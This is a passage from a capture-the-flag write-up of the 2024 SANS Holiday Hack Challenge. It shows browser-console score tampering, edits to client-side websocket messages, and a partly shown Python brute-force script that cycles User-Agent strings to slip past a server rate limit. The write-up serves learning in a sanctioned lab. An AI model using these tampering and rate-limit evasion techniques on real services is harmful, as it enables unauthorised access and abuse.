{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":""},{"location":"#introduction","title":"Introduction","text":"<p>Season's greetings! Welcome to my detailed exploration of the 2024 SANS Holiday Hack Challenge! This year's event, themed \"Snow-maggedon,\" offers an immersive adventure where participants sharpen their cybersecurity skills through engaging real-world challenges set in a whimsical holiday environment.</p> <p>This year's festive challenge unfolds through a Prologue and three Acts, each introducing new challenges and advancing the storyline:</p> <ul> <li>Prologue: Launched on November 7, 2024</li> <li>Act 1: Released on November 11, 2024</li> <li>Act 2: Scheduled for release on November 18, 2024</li> <li>Act 3: Scheduled for release on December 2, 2024</li> </ul> <p>Participants are encouraged to share solutions to the Prologue, Act 1, and Act 2 challenges starting once the next section has been released. However, for Act 3, players must wait until after the competition ends before sharing their answers or solutions.</p> <p>A heartfelt thank you to the SANS Institute and the entire Holiday Hack Challenge team for orchestrating this festive and educational event. Their dedication to fostering a global cybersecurity community through engaging and accessible challenges is truly commendable.</p> <p>This write-up aims to assist first-time participants, cybersecurity enthusiasts, seasoned professionals, and everyone in between. Whether you're seeking guidance on a particularly tricky challenge or exploring the exciting world of cybersecurity, I hope this resource provides valuable insights and support.</p> <p>Let's embark on this journey together, unraveling the mysteries of Snow-maggedon and enhancing our cybersecurity skills in the most festive way possible!</p> <p>Note</p> <p>So far this write-up covers the objectives in the prologue, Act I and Act II. I shall include more content as I progress in the game and according to the sharing rules of the game.</p> <p>50-page submission limit</p> <p>Each year there's a huge number of write-ups that need to be reviewed by the Counter Hack team. To find a good middle ground between preventing information overload and creating a write-up that can stand on its own as a learning resource, some parts, like the navigation tip below, are collapsed by default. Skipping over these will not take away from understanding the overall solution, but feel free to expand them to get some additional information.</p> Navigation tip <p>Even with less than 50 pages, there's still quite a bit of information to read through. To make things a little easier, you can use P or , to go to the previous section, N or . to navigate to the next section, and S, F, or / to open up the search dialog.</p> <p>TL;DR if you keep pressing N or . from this point forward, you'll hit all the content in the right order! </p>"},{"location":"#answers","title":"Answers","text":""},{"location":"#prologue","title":"Prologue","text":"<p> 1. Holiday Hack Orientation - </p> <p>Follow Jingle Ringford's instructions to see what to expect from Holiday Hack Challenge 2024.</p> <p> 2. Elf Connect - </p> <p>Help Angel Candysalt connect the dots in a game of connections.</p> <p> 3. Elf Minder 9000 - </p> <p>Assist Poinsettia McMittens with playing a game of Elf Minder 9000.</p>"},{"location":"#act-1","title":"Act 1","text":"<p> 4. Frosty Keypad - </p> <p>In a swirl of shredded paper, lies the key. Can you unlock the shredder\u2019s code and uncover Santa's lost secrets?</p> <p> 5. cURLing - </p> <p>Team up with Bow Ninecandle to send web requests from the command line using Curl, learning how to interact directly with web servers and retrieve information like a pro!</p> <p> 6. Hardware Hacking 101 - </p> <p>Ready your tools and sharpen your wits\u2014only the cleverest can untangle the wires and unlock Santa\u2019s hidden secrets!</p> <p> 6a. Hardware Hacking 101 Part 1 - </p> <p>Jingle all the wires and connect to Santa's Little Helper, to reveal the merry secrets locked in his chest!</p> <p> 6b. Hardware Hacking 101 Part 2 - </p> <p>Santa\u2019s gone missing, and the only way to track him is by accessing the Wish List in his chest\u2014modify the access_cards database to gain entry!</p> <p> 7. Mobile Analysis - </p> <p>Help find who has been left out of the naughty AND nice list this Christmas. Please speak with Eve Snowshoes for more information.</p> <p> 8. Drone Path - </p> <p>Help the elf defecting from Team Wombley get invaluable, top secret intel to Team Alabaster. Find Chimney Scissorsticks, who is hiding inside the DMZ.</p> <p> 9. PowerShell - </p> <p>Team Wombley is developing snow weapons in preparation for conflict, but they've been locked out by their own defenses. Help Piney with regaining access to the weapon operations terminal.</p> <p> 10. Snowball Showdown - </p> <p>Wombley has recruited many elves to his side for the great snowball fight we are about to wage. Please help us defeat him by hitting him with more snowballs than he does to us.</p> Credits <p>This write-up is published using the template created by Tomas Bouve available here. Thanks for giving back to the community.</p>"},{"location":"objectives/o1/","title":"Holiday Hack Orientation","text":"<p>Difficulty:  Direct link: Orientation Terminal</p>"},{"location":"objectives/o1/#objective","title":"Objective","text":"<p>Request</p> <p>Talk to Jingle Ringford on Christmas Island and get your bearings at Geese Islands.</p> Jingle Ringford <p>Welcome to the Geese Islands and the 2023 SANS Holiday Hack Challenge! I'm Jingle Ringford, one of Santa's many elves. ... Just kidding! It's actually the 2024 SANS Holiday Hack Challenge! And although we're on Frosty's Beach on Christmas Island, we'll soon be on our way back to the North Pole. I thought it best to wait here for people that heard we're on the Geese Islands but may not know we're leaving. I haven't seen Santa since we started packing up, but he always asks me to give a quick orientation to newcomers, so I'm continuing the tradition. Before you head out any further onto the island, you need to accomplish two simple tasks.</p> <p>But first, here's a parting gift. I packed this snowball made of the magical, never-melting snow of Christmas Island. A little souvenir to take with you when we leave for the North Pole.</p> <p>Click on the snowball on your avatar. That's where you will see your Objectives, Hints, resource links, and Conversations for the Holiday Hack Challenge.</p> <p>Now, click on the Cranberry Pi Terminal and follow the on-screen instructions.</p>"},{"location":"objectives/o1/#solution","title":"Solution","text":"<p>This is the first terminal challenge made intentionally simple to start off the experience. All we need to do is type \"answer\" in the terminal.</p> <p></p> <p>Follow the terminal instructions to complete the challenge.</p> <p></p>"},{"location":"objectives/o1/#reward","title":"Reward","text":"<p> Gold Trophy</p>"},{"location":"objectives/o1/#response","title":"Response","text":"<p>Jingle Ringford</p> <p>You're a natural! Something new this year you may not know is that all challenges have an easy and hard mode. There's also story mode, if you want to skip the challenges and watch how our holiday season's adventure unfolds!</p> <p>Your snowball will reflect how you've solved the challenges with the bronze, silver, and gold trophies.</p> <p>Well, that's it, now you're orientated! Feel free to get yourself settled in, establish a cohort with others, or just explore this lovely island. Just be careful where you walk as we are moving around some pretty heavy crates.</p> <p>Oh, while we're preparing everything to set sail for the North Pole, I heard Poinsettia McMittens and Angel Candysalt could use some assistance. I'm sure they'll appreciate any help you can provide!</p> <p>We'll let you know when the boat leaves, but for now relax, enjoy the sun, and most importantly, have FUN!</p>"},{"location":"objectives/o10/","title":"Snowball Showdown","text":"<p>Difficulty:  Direct link: Snowball Showdown</p>"},{"location":"objectives/o10/#objective","title":"Objective","text":"<p>Request</p> <p>Wombley has recruited many elves to his side for the great snowball fight we are about to wage. Please help us defeat him by hitting him with more snowballs than he does to us.</p> Dusty Giftwrap <p>Hi there! I'm Dusty Giftwrap, back from the battlefield! I'm mostly here for the snowball fights!</p> <p>But I also don't want Santa angry at us, you wouldn't like him when he's angry. His face becomes as red as his hat! So I guess I'm rooting for Alabaster.</p> <p>Alabaster Snowball seems to be having quite a pickle with Wombley Cube. We need your wizardry.</p> <p>Take down Wombley the usual way with a friend, or try a different strategy by tweaking client-side values for an extra edge.</p> <p>Alternatively, we've got a secret weapon - a giant snow bomb - but we can't remember where we put it or how to launch it.</p> <p>Adjust the right elements and victory for Alabaster can be secured with more subtlety. Intriguing, right?</p> <p>Raring to go? Terrific! Here's a real brain tickler. Navigator of chaos or maestro of subtlety, which will you be? Either way, remember our objective: bring victory to Alabaster.</p> <p>Confidence! Wit! We've got what it takes. Team up with a friend or find a way to go solo - no matter how, let's end this conflict and take down Wombley!</p>"},{"location":"objectives/o10/#solution","title":"Solution","text":""},{"location":"objectives/o10/#easy-mode","title":"Easy Mode","text":"<p>Looking at the front-end code, we can identify that this game relies on websockets. We can modify game parameters before sending them to server by seeing where this is happening in the code, particularly when a snowball is fired.</p> <pre><code>let snowball = {\n    \"type\": \"snowballp\",\n    \"x\": snowBallPosition.x,\n    \"y\": snowBallPosition.y,\n    \"owner\": this.player1.playerId,\n    \"isWomb\": this.player1.isWomb,\n    \"blastRadius\": this.snowBallBlastRadius,\n    \"velocityX\": velocityX,\n    \"velocityY\": velocityY\n};\nthis.ws.sendMessage(snowball);\n</code></pre> <p>By ovwerrides feature in the browser Dev Tools, I modified the snowball object and set the blastRadius to 200. On doing so, and after the first snowball is fired, we see a message in the game \"CHEATING HACKER DETECTED\". We can play this game and once we win, we are awarded the Silver Trophy.</p> Dusty Giftwrap <p>Fantastic work! You've used your hacker skills to lead Alabaster\u2019s forces to victory. That was some impressive strategy!</p> <p>Christmas is on the line! For a mischievous edge-up, dive into the game\u2019s code - a few client-side tweaks to speed, movement, or power might shift the balance\u2026 or just help us find that secret weapon we misplaced!</p>"},{"location":"objectives/o10/#hard-mode","title":"Hard Mode","text":"<p>The Hard Mode challenge was a matter of identifying what is the 'mother-of-all-snow-bombs' in the code. Looking through the code, the following line catches my attention:</p> <pre><code>this.load.image('dwarf-min', \"imgs/MOASB-min-dwarf.png\");\n</code></pre> <p>MOASB found!</p> <p> MOASB is the 'mother-of-all-snow-bombs'</p> <p>On line 861 of the game script, there is this line that defines what moasb is. I decided to adapt this code to call it directly from the console.</p> <pre><code>game.scene.scenes[0].ws.sendMessage({ type: 'moasb'});\n</code></pre> <p>MOASB Launched</p> <p>As soon as I did this, a North Pole plane came to the rescue, carrying the MOASB, which was dropped on Wombley, graned 999 points and immediately finished the game, giving me the Gold Trophy.</p>"},{"location":"objectives/o10/#images","title":"Images","text":""},{"location":"objectives/o10/#response","title":"Response","text":"Dusty Giftwrap <p>Brilliant! You unravel the puzzle and launched the 'mother-of-all-snow-bombs' like a true mastermind. Wombley never saw it coming!</p> <p>Excellent! With Wombley\u2019s forces defeated, they\u2019ll have no choice but to admit defeat and abandon their wild plans to hijack Christmas.</p>"},{"location":"objectives/o2/","title":"Elf Connect","text":"<p>Difficulty:  Direct link: Elf Connect</p>"},{"location":"objectives/o2/#objective","title":"Objective","text":"<p>Request</p> <p>Help Angel Candysalt connect the dots in a game of connections.</p> Angel Candysalt <p>Welcome back, island adventurer! I'm Angel Candysalt \u2014 so happy to finally meet you! I'm thrilled you're here because I could really use a hand with something. Have you ever heard of a game called Connections? It\u2019s simple! All you need to do is find groups of four related words. I've been stuck on it all day, and I'm sure someone as sharp as you will breeze through it. Oh, and while you're at it, check out randomElf's score \u2014 they hit fifty thousand points, which seems\u2026 oddly suspicious. Think they might have tampered with the game? Just a hunch!</p>"},{"location":"objectives/o2/#hints","title":"Hints","text":"Elf Connect Easy <p>I love brain games! This one is like the New York Times Connections game. Your goal here is to find groups of items that share something in common. Think of each group as having a hidden connection or theme\u2014four items belong together, and there are multiple groups to find! See if you can spot patterns or common threads to make connections. Group all the items correctly to win!</p> Elf Connect Hard <p>WOW! A high score of 50,000 points! That\u2019s way beyond the limit! With only four rounds and a max of 400 points per round, the top possible score should be 1,600 points. So, how did someone get to 50,000? Something unusual must be happening!</p> <p>If you're curious, you might want to check under the hood. Try opening the browser's developer tools console and looking around\u2014there might even be a variable named 'score' that could give you some insights. Sometimes, games hold secrets for those who dig a little deeper. Give it a shot and see what you can discover!</p>"},{"location":"objectives/o2/#solution","title":"Solution","text":""},{"location":"objectives/o2/#easy-mode","title":"Easy Mode","text":"<p>To complete this challenge in easy mode, we can try and guess the groups, or do some research to learn what the members of each group should be. We could do this programatically via the browser console to be able to get the expected answers. The information is contained in the website's javascript, which we can read and understand. To be able to see the group sets for each section, we can run the code \"Display Correct Sets\" available in the code block. An easier way is to run code \"Automatically Select and Submit Correct Groups\" which will automatically submit the correct sets and complete the round.</p> <p>Success! You have defeated the Elf Connect!!!!</p>"},{"location":"objectives/o2/#hard-mode","title":"Hard Mode","text":"<p>But how we are going to exceed a high score of 50000?</p> <p> Each round will give us a maximum score of 400. This means that the maximum we can get is 1600. </p> <p>To win the Gold trophy for this challenge, we just need to exceed the high score of 50000. Investigating the code, we can see that the script is just submiting an action with a value of 1, when the round is completed successfully, and a value of 2 when the high score is exceeded. There is nothing going to, or coming from the server that determines the high score. So all we need to do is set the score to 50,000 or more at the start of the game, and when we get the first matching set, we earn the gold trophy. </p> <p>Great Job Hacker! Elf Connect Complete and Hacked!</p>"},{"location":"objectives/o2/#images","title":"Images","text":""},{"location":"objectives/o2/#code-blocks","title":"Code blocks","text":"Display Correct SetsAutomatically Select and Submit Correct GroupsSet the Score Display Correct Sets<pre><code>correctSets.forEach((set, index) =&gt; {\n    console.log(`Set ${index + 1}:`);\n    set.forEach(wordIndex =&gt; {\n        console.log(words[wordIndex]);\n    });\n    console.log('----------------');\n});\n</code></pre> Automatically Select and Submit Correct Groups<pre><code>correctSets.forEach((set, setIndex) =&gt; {\nselectedBoxes = set.map(index =&gt; wordBoxes.find(box =&gt; box.index === index));\ncheckSelectedSet(mainScene);\n});\n</code></pre> Set the Score<pre><code>score = 50000\n</code></pre>"},{"location":"objectives/o2/#answers","title":"Answers","text":"Round 1Round 2Round 3Round 4 GROUP A GROUP B GROUP C GROUP D Tinsel Sleigh Belafonte Comet Garland Bag Jingle Bells Vixen Star Mittens Crosby Prancer Lights Gifts White Christmas Blitzen GROUP A GROUP B GROUP C GROUP D Nmap burp Frida Metasploit netcat OWASP Zap Cycript Cobalt Strike Wireshark Nikto AppMon HAVOC Nessus wfuzz apktool Empire GROUP A GROUP B GROUP C GROUP D AES WEP Symmetric Caesar RSA WPA2 Cycript One-time Pad Blowfish TKIP hash Ottendorf 3DES LEAP hybrid Scytale GROUP A GROUP B GROUP C GROUP D IGMP TLS Ethernet HTTP IPX SSL PPP FTP IP IPSec IEEE 802.11 SMTP ICMP SSH ARP DNS"},{"location":"objectives/o2/#response","title":"Response","text":"<p>Angel Candysalt</p> <p>If you want a more difficult challenge, try beating randomElf's score.</p>"},{"location":"objectives/o3/","title":"Elf Minder 9000","text":"<p>Difficulty:  Direct link: Elf Minder 9000</p>"},{"location":"objectives/o3/#objective","title":"Objective","text":"<p>Request</p> <p>Assist Poinsettia McMittens with playing a game of Elf Minder 9000.</p> Poinsettia McMittens <p>Center your mind, and become one with the island! Relax... This isn't working! I'm trying to play this game but the whole \"moving back to the North Pole\" thing completely threw me off. Say, how about you give it a try. It's really simple. All you need to do is help the elf get to the exit. The faster you get there, the better your score! I've run into some weirdness with the springs though. If I had created this game it would've been a lot more stable, but I won't comment on that any further.</p>"},{"location":"objectives/o3/#hints","title":"Hints","text":"Elf Minder 9000: RTD (Read the Docs) <p>Be sure you read the \"Help\" section thoroughly! In doing so, you will learn how to use the tools necessary to safely guide your elf and collect all the crates.</p> Elf Minder 9000: TODO <p>When developing a video game\u2014even a simple one\u2014it's surprisingly easy to overlook an edge case in the game logic, which can lead to unexpected behavior.</p> Elf Minder 9000: Reusable Paths <p>Some levels will require you to click and rotate paths in order for your elf to collect all the crates.</p>"},{"location":"objectives/o3/#solution","title":"Solution","text":""},{"location":"objectives/o3/#easy-mode","title":"Easy Mode","text":"<p>Welcome to the world of Elf Minder 9000, a game that brings holiday cheer with a twist. For the most part, Elf Minder 9000 can be enjoyed without any hacking skills, offering a fun, festive experience. However, as the levels progress and challenges become more devious, a bit of holiday \"hacker magic\" might be just what you need to prevail. When the game becomes a real nutcracker, clever workarounds and some elven shenanigans are often the keys to success.</p> <p>Each level in Elf Minder 9000 has two scoreboards:</p> <ul> <li>Good Boss Mode     In this mode, players aim to finish the level with the least number of segments and in the shortest possible time. It rewards efficient and precise gameplay.</li> <li>Evil Boss Mode     This mode flips things on its head\u2014the goal is to take longer, pass through as many segments as possible, and make the fewest rotations. It's all about taking the scenic route and making the journey delightfully inefficient.</li> </ul> <p>Some of the more beginner-friendly levels, such as Sandy Start, Waves and Crates, Tidal Treasures, Dune Dash, Coral Cove, Shell Seekers, Palm Grove Shuffle, Tropical Tangle, and Crate Caper, can be completed without relying on any special tricks or hacks. They provide a great introduction for players of all skill levels.</p> <p>My eight-year-old daughter enjoyed playing Elf Minder 9000, and it was a joy to watch her enthusiasm grow. However, she quickly learned an important lesson\u2014sometimes, simply playing by the rules won\u2019t get you a place on the leaderboard!</p> <p>When we reached Shoreline Shuffle, it became clear that a bit of creative ingenuity was required. Digging into the code behind the scenes, we stumbled upon something interesting in guide.js. There was a constant called whyCantIHoldAllTheseSprings, which logs in the browser's console when the hero attempts to pass over three springs\u2014something that shouldn't be possible since the game only lets you use two springs by default. This clue led us to explore the game.entities.push() method, which, as it turns out, allows us to directly add objects into the game.</p> <p>With this newfound discovery, we realized we could place springs adjacent to boulders, a feat that regular gameplay mechanics would not normally permit. By leveraging these sneaky elven hacks, we successfully conquered Shoreline Shuffle. Here's what we ended up with for that level:</p> <p></p> <p>When passing the 3rd spring, we also saw this message in the browser console!</p> WHY CAN'T I HOLD ALL THESE SPRINGS?? <pre><code>                             WHY CAN'T I HOLD ALL THESE SPRINGS??\n\n                                            .--======-                                                          \n                                        --              --.                                                     \n                                    -=                     =:                                                  \n                                .=                         -                                                 \n                                -.                            -                                               \n                                ::                             .:                                              \n                                :                               :.                                             \n                                +                                 -                                             \n                            .-                                 :                                             \n                            ::                                 .-                                            \n                            ..                                  =                                            \n                            :                 :.                =:                                           \n                            :                                  =:  -                                         \n                                =                                *    -                                         \n                                ..       :        .:. ..              -                                         \n                                .                                   :.                                         \n            =.   .++:  ..        .   .                 :            =                                           \n        +  *=.       =         -       .         *@@ .+          #                                            \n        -+-     .:-**--::::     =               :+#%*-.          .:                                            \n    :-   -+.            -      = .@@# *                        =                                             \n.#   .*               :-       .: #+:                          :                                             \n+   +=     -#.            -        =       :                     -                                             \n#        .=                =        .      +                      -.             .=++-         :-               \n=      -.          .++=-=+-         .     =        -                    ..:----    ...           ::             \n+   .-     :=.      : ..-+%+         +    :-   :: ..                           -***+++++=          =            \n-      .+        ..-::   *%:--.      +     -          .-*:                  .++*++++----::.       ..           \n.:   #       =%:.-:.    :*#:=+%=      #           .***+--=::--:..  .-:      :++*-::----:::....:    =           \n#      .+.   -.::    ..=#=: .*#.      .=  :+**:.+**==+:...:::::::::-. +:  :.-++.          .::-... +           \n+           .:.:    .--*... .#+-:=**-   -.     -+*+#+-.  -          .-=#. :.*:+*=..          .:- - -          \n=        ++=-.:    ..-*-..  ++::---*%- :=-.    -++*:    ..           =%#. :.-*-:=*+-.....      .-.+ -.        \n=       :*==.-.   ..-*:..  =:.-...:=%=....::   .:++++. :-......-===*#%+. .=:--+..::-+*+=---..   =#*. :        \n+       +*=*=-.  ..-*::. -+...     =#:.=+*%-+  . --:-++*********=:.-::**.:=..:=+:  :... :+**###%@*.   #       \n+       **=#=#   -*+:.-=+= ..     -*.-.   ##.   :..*+--:.......:-:   .*#:::  .:. =+.    :-:....:.      -      \n+       -***+=-+*+:-: ==..:.     =-.:     *#:.=#+::--===:         .-+%#::.+=+-...:..-==.     .+#=      :      \n+        ++++++-:===+=..:.-    .+:.:    .=*-:..:##-..:.....:::::::-=-:..:-.=.    ..:....:+###%#-        *     \n=          .-.:--:.:-:.:=:    ==...    .-+.:   .+%:+#+.-..::::...:---:=+:.:-=.         :-::...           :    \n..         +  -...-=.  .+- .+-.::     .=- .  .:=**-==*%==            -+#- .:.:=:         .--=            -    \n:         *  -   . -****-.-::-.:    .+...  :: -=.-:.=%=**.          +%#=+-..::.-*=:.     .+#:            #   \n-         *  -     ..:::::. .=-.  :=..:  ... .:..+-.=%=+%========+#%*::=      .:.. :*#**#%-              .  \n    =        :  =         ..=+-:=====..:.  ... -....=- +.-=*-........--.-=-=.   +    ..:::::.                :  \n    *        ..:            ......-::.--. .-:=:..  . =+.:-=.:       . =-=#=.:=-..--      :-*                 -  \n    :.        -.                 .==:.-=. -+:..     -= ::::.        ::-+*%-:...=+=...    :+#.                =  \n    .        =.                  .  ....=-:.      -:.:==:.-.:.... .-=+%#:    ... .=**+*#%#:                 .: \n    :        -                   . .:..+=-+.   -=..:+.=.:-..........:::-=--:..    .:::::.                   .- \n    :        .=  = .:           .=   .=. .....--....=:.--:      .:.+=..=*+- ..::.    +==.                    + \n    :         -   =  .-         .:     =  ...-+=-:--::=.   ....:.:.:.  =%=.:-.  .=.. :*#.                    + \n    -         :  ==    +.        :=     :-  ...::...::--==-......=:-==#%-  ....:=**#%+.                     + \n    -          . .=:     +       .:.:     *        .-=--:...-=========:-*:      .:---+-.                     + \n    -             -+      -       :.*      =:      : +-     ...:---. -:-*+        :-** -                     + \n    -             :=..     .+       *        +     .:.:+         .:=- .*%-.-+==--=*%+. =                     + \n    -              .- :=      :=++==.         .-   ..+:-==-.      .-=##+=+.....-===*-  :==:                  + \n    -               .-   =                      -.  . = ..............=*#-:-===+##*=--.                      + \n    -                =-%=                        -:  .:.-.         .-+#+. .:.:=-:                           -  \n    -                 - :*.                       -    ..:..::--:.. .-. :==*                                :  \n    =                 : - .+                      .-        .*+.                                         =    \n    =                = *    .=                      -+====:                                            :.    \n        =               = -.      --                                                                     :      \n        :              =  :          .---:::                                                           =       \n        =              =  -                   .==..                                                  +         \n        -                :                            .+*+.                                      :=           \n        -.             :.                                        ::---=+**+-.               -#:              \n            ..            *                                                           :                         \n            ::           #                                                           -                         \n            :          +:                                                          :.                         \n            :.      :-.                                                           =                          \n                        :                                                           .                          \n                        :                                                          -                           \n                        -                                                         .-                           \n                        =                                                         -                            \n                        -                                                        ..                            \n                        -                                                         +\n</code></pre> <p>Success! Once we have completed the 12 Games, we are awarded the Silver Trophy.</p>"},{"location":"objectives/o3/#hard-mode","title":"Hard Mode","text":"<p>Upon completing the first twelve levels, we earn the Silver Trophy, which unlocks an even trickier mode called A Real Pickle. This is where things start getting even more entertaining, as the stakes rise and the puzzles become truly brain-bending. However, now that we have learned that it's not about bending the spoon, but believing there is no spoon, we can place springs and tunnels wherever we want! This newfound ability allows us to place tunnels at the edge of boulders, making it much easier to reach the finish line.</p> <p></p> <p>Success! We are awarded the Gold Trophy.</p> <p>At this point, we could go back and try to get our name on one of the scoreboards, but there is still so much more to learn.</p>"},{"location":"objectives/o3/#response","title":"Response","text":"<p>Poinsettia McMittens</p> <p>The rest of these elves are like corporate zombos. They just run around in circles unless you give them some direction. Way to pass them some of your super centered energy. Better you than me, though. I'd let them walk themselves straight off the island.</p> <p>You took the easy win, it seems we're kindred spirits. But there's also a hard way to solve this challenge. The more segments you use, the higher the reward. But who actually wants life to be more difficult?</p>"},{"location":"objectives/o4/","title":"Frosty Keypad","text":"<p>Difficulty:  Direct link: Frosty Keypad</p>"},{"location":"objectives/o4/#objective","title":"Objective","text":"<p>Request</p> <p>In a swirl of shredded paper, lies the key. Can you unlock the shredder\u2019s code and uncover Santa's lost secrets?</p> Morcel Nougat <p>Hello again! I'm Morcel Nougat, dashing around like a reindeer on a sugar rush! We've got a bit of a dilemma, and I could really use your expertise.</p> <p>Wombley and Alabaster have taken charge now that Santa\u2019s gone missing, and We're scrambling to get the Wish List secured. But... one of the elves in the Data Management Team got overzealous, and the Shredder McShreddin 9000 gobbled up a crucial document we need to access Santa's chest!</p> <p>It\u2019s our golden ticket to getting Santa\u2019s Little Helper tool working properly. Without it, the hardware hack we're planning is as empty as Santa\u2019s sleigh in January.</p> <p>Think you can help? I can get you into the Shredder McShreddin 9000\u2019s inner workings to retrieve the pieces, but there are two access codes involved. One of the elves left a hint, but it\u2019s all a blur to me!</p> <p>I've noticed that some elves keep referring to a certain book when they walk by. I bet it has the answers we need to crack the code and recover the document!</p> <p>You know, some of the elves always have their noses in the same book when they pass by here. Maybe it\u2019s got the clues we need to crack the code?</p>"},{"location":"objectives/o4/#hints","title":"Hints","text":"Shine Some Light on It <p>Well this is puzzling. I wonder if Santa has a seperate code. Bet that would cast some light on the problem. I know this is a stretch...but...what if you had one of those fancy UV lights to look at the fingerprints on the keypad? That might at least limit the possible digits being used...</p> Just Some Light Reading <p>See if you can find a copy of that book everyone seems to be reading these days. I thought I saw somebody drop one close by...</p> Who Are You Calling a Dorf? <p>Hmmmm. I know I have seen Santa and the other elves use this keypad. I wonder what it contains. I bet whatever is in there is a National Treasure!  </p>"},{"location":"objectives/o4/#solution","title":"Solution","text":""},{"location":"objectives/o4/#easy-mode","title":"Easy Mode","text":"<p>Looking carefully at the hints, we are told to refer to the Frosty Book which we have collected earlier, that was on the floor close by to the Frosty Keypad. Reading the book does not yield any clues, but the Frosty Keyboard had a note with a hidden message that could be extracted from the story.</p> <p></p> <p>These look like some form of coordinates, which turn out to be specific leters which we need from the book. The format is Page Number:Word:Letter.</p> Frosty Book <pre><code>\"Page 1: \\n\\r'Twas the night before Christmas, when all through the house\\n\\rNot a creature was stirring, not even a mouse;\\n\\rThe stockings were hung by the chimney with care,\\n\\rIn hopes that St. Nicholas soon would be there;\",\n  \"Page 2: \\n\\rThe children were nestled all snug in their beds;\\n\\rWhile visions of sugar-plums danced in their heads;\\n\\rAnd mamma in her 'kerchief, and I in my cap,\\n\\rHad just settled our brains for a long winter's nap,\",\n  \"Page 3: \\n\\rWhen out on the lawn there arose such a clatter,\\n\\rI sprang from my bed to see what was the matter.\\n\\rAway to the window I flew like a flash,\\n\\rTore open the shutters and threw up the sash.\",\n  \"Page 4: \\n\\rThe moon on the breast of the new-fallen snow,\\n\\rGave a lustre of midday to objects below,\\n\\rWhen what to my wondering eyes did appear,\\n\\rBut a miniature sleigh and eight tiny rein-deer,\",\n  \"Page 5: \\n\\rWith a little old driver so lively and quick,\\n\\rI knew in a moment he must be St. Nick.\\n\\rMore rapid than eagles his coursers they came,\\n\\rAnd he whistled, and shouted, and called them by name:\",\n  \"Page 6: \\n\\r\\\"Now, Dasher! now, Dancer! now Prancer and Vixen!\\n\\rOn, Comet! on, Cupid! on, Donder and Blitzen!\\n\\rTo the top of the porch! to the top of the wall!\\n\\rNow dash away! dash away! dash away all!\\\"\",\n  \"Page 7: \\n\\rAs leaves that before the wild hurricane fly,\\n\\rWhen they meet with an obstacle, mount to the sky;\\n\\rSo up to the housetop the coursers they flew\\n\\rWith the sleigh full of toys, and St. Nicholas too\u2014\",\n  \"Page 8: \\n\\rAnd then, in a twinkling, I heard on the roof\\n\\rThe prancing and pawing of each little hoof.\\n\\rAs I drew in my head, and was turning around,\\n\\rDown the chimney St. Nicholas came with a bound.\",\n  \"Page 9: \\n\\rHe was dressed all in fur, from his head to his foot,\\n\\rAnd his clothes were all tarnished with ashes and soot;\\n\\rA bundle of toys he had flung on his back,\\n\\rAnd he looked like a pedler just opening his pack.\",\n  \"Page 10: \\n\\rHis eyes\u2014how they twinkled! his dimples, how merry!\\n\\rHis cheeks were like roses, his nose like a cherry!\\n\\rHis droll little mouth was drawn up like a bow,\\n\\rAnd the beard on his chin was as white as the snow.\",\n  \"Page 11: \\n\\rThe stump of a pipe he held tight in his teeth,\\n\\rAnd the smoke, it encircled his head like a wreath;\\n\\rHe had a broad face and a little round belly\\n\\rThat shook when he laughed, like a bowl full of jelly.\",\n  \"Page 12: \\n\\rHe was chubby and plump, a right jolly old elf,\\n\\rAnd I laughed when I saw him, in spite of myself;\\n\\rA wink of his eye and a twist of his head\\n\\rSoon gave me to know I had nothing to dread;\",\n  \"Page 13: \\n\\rHe spoke not a word, but went straight to his work,\\n\\rAnd filled all the stockings; then turned with a jerk,\\n\\rAnd laying his finger aside of his nose,\\n\\rAnd giving a nod, up the chimney he rose;\",\n  \"Page 14: \\n\\rHe sprang to his sleigh, to his team gave a whistle,\\n\\rAnd away they all flew like the down of a thistle.\\n\\rBut I heard him exclaim, ere he drove out of sight\u2014\\n\\r\u201cHappy Christmas to all, and to all a good night!\u201d\"    \n</code></pre> Reference Word Letter Keypad Code 2:6:1 snug S 7 4:19:3 what A 2 6:1:1 Now N 6 3:10:4 clatter T 8 14:8:3 team A 2 <p>Frosty Keypad Code: 72682</p> <p>Success! You have defeated the Frosty Keypad!!!!</p> <p>Morcel Nougat</p> <p>WOW, you did it! You know, they say Ottendorf ciphers were used back in the Frosty Archives crisis\u2026 or was that during the Jack Frost incident? Either way, you're amazing!</p>"},{"location":"objectives/o4/#hard-mode","title":"Hard Mode","text":"<p>For the hard challenge. the hints pointed towards needing to also find a torch with UV light capabilities. These items were conveniently located around the Frosty Keypad challenge, and after a short stroll, I was able to gather them.</p> <p>Returning to the Frosty Keypad, I now had the torch to shine on the keypad, revealing the keys that had been pressed: 2, 6, 7, 8, and Enter. A quick glance at the source code showed that the maximum number of digits allowed was five. Initially, I manually tried all possible combinations with four numbers, but when that didn\u2019t work, I had to turn to some good old-fashioned coding magic.</p> <p>I enlisted the help of my friend Chatty to draft a script for this challenge. The first attempt, however, returned an error:</p> <p>Failure</p> <p>Too many requests from this User-Agent. Limited to 1 request per 1 second.</p> <p>The message was clear: a rate-limit was in place, restricting requests from the same User-Agent to just one per second. I asked Chatty to revise the script, adding a touch of holiday ingenuity. We included five different User-Agent strings and had the script cycle through them, ensuring that each request used a different one. This allowed us to bring the delay down to 0.2 seconds between requests, effectively bypassing the rate limit without raising suspicion.</p> <p>With this improved approach, the script needed only 24 attempts to successfully uncover the correct code. Sometimes, a little festive creativity (and some clever coding) is all it takes to solve even the trickiest puzzles!</p> <p>Frosty Keypad Code: 22768</p> <p>Success! You have defeated the Frosty Keypad!!!!</p>"},{"location":"objectives/o4/#images","title":"Images","text":""},{"location":"objectives/o4/#code-blocks","title":"Code blocks","text":"Source CodeCode Execution brute_frosty_keypad.py<pre><code>import itertools\nimport requests\nimport time\nimport random\nfrom itertools import cycle\n\n# Digits to be used in generating 5-digit combinations\ndigits = ['2', '6', '7', '8']\n\n# Generate all possible 5-digit numbers with at least one repeat of the digits 2, 6, 7, 8\ncombinations = set()\nfor comb in itertools.permutations(digits, 4):\n    for digit in digits:\n        # Insert the repeated digit at all possible positions to make a 5-digit number\n        for i in range(5):\n            number = list(comb)\n            number.insert(i, digit)\n            combinations.add(\"\".join(number))\n\nurl = \"https://hhc24-frostykeypad.holidayhackchallenge.com/submit?id=6dc032c6-8b15-4bdf-a320-83e1e267bb76\"\n\n# List of user agents to randomize\nuser_agents = [\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) 